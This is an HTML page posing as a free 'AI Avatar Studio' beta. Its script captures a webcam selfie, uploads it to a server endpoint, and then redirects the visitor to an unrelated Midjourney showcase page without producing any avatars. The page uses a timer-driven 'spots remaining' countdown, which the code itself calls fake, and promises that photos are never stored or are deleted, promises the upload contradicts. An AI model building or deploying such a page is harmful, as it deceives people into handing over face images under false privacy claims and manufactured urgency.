<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>AI Avatar Creator – Beta</title>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body { 
      background: linear-gradient(135deg, #0b0f1c, #1a1f35); 
      font-family: 'Inter', sans-serif; 
      display: flex; 
      justify-content: center; 
      align-items: center; 
      min-height: 100vh; 
      color: white;
    }
    .card {
      background: rgba(255,255,255,0.05);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 40px;
      padding: 40px 30px;
      max-width: 440px;
      width: 100%;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0,0,0,0.8);
    }
    .badge { 
      background: #facc15; 
      color: #000; 
      padding: 6px 18px; 
      border-radius: 40px; 
      font-weight: 700; 
      font-size: 14px; 
      display: inline-block;
      margin-bottom: 12px;
    }
    h1 { font-size: 28px; font-weight: 700; margin-bottom: 8px; }
    .sub { opacity: 0.7; font-size: 15px; margin-bottom: 20px; }
    .counter { color: #facc15; font-weight: 700; font-size: 18px; margin-bottom: 18px; }
    video { 
      width: 100%; 
      border-radius: 24px; 
      background: #111; 
      border: 2px solid rgba(255,255,255,0.15);
      transform: scaleX(-1);
    }
    .btn {
      background: #7c3aed;
      border: none;
      padding: 16px 32px;
      border-radius: 60px;
      font-size: 18px;
      font-weight: 700;
      color: white;
      width: 100%;
      margin-top: 18px;
      cursor: pointer;
      transition: 0.2s;
      box-shadow: 0 0 30px #7c3aed66;
    }
    .btn:hover { background: #6d28d9; transform: scale(1.01); }
    .trust { 
      display: flex; 
      justify-content: center; 
      gap: 20px; 
      margin-top: 20px; 
      font-size: 12px; 
      opacity: 0.5; 
    }
    #status { margin-top: 16px; color: #a78bfa; font-weight: 500; }
  </style>
</head>
<body>
<div class="card">
  <div class="badge">🔥 BETA – FREE</div>
  <h1>AI Avatar Studio</h1>
  <div class="sub">One live selfie = 10 unique AI styles</div>
  <div class="counter">⏳ <span id="spots">43</span> spots remaining</div>
  <video id="video" autoplay></video>
  <button class="btn" id="capture">✨ Generate my avatars</button>
  <div id="status">Camera required – we never store your photo</div>
  <div class="trust">🔒 Encrypted · ⚡ Deleted after render · 🤖 Powered by Flux AI</div>
</div>
<script>
  const video = document.getElementById('video');
  const status = document.getElementById('status');
  const spots = document.getElementById('spots');

  // Fake decreasing counter
  setInterval(() => {
    let n = parseInt(spots.innerText);
    if (n > 10) spots.innerText = n - 1;
  }, 8000);

  navigator.mediaDevices.getUserMedia({ video: true })
    .then(s => { video.srcObject = s; })
    .catch(() => status.innerText = '⚠️ Please allow camera access');

  document.getElementById('capture').onclick = function() {
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);

    status.innerText = '⏳ Generating your avatars...';
    fetch('/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ image: dataUrl })
    })
    .then(res => res.json())
    .then(() => {
      status.innerText = '✅ Almost ready – redirecting...';
      setTimeout(() => window.location.href = 'https://www.midjourney.com/showcase', 1800);
    })
    .catch(() => status.innerText = '⏳ Retry – we’re at capacity');
  };
</script>
</body>
</html>
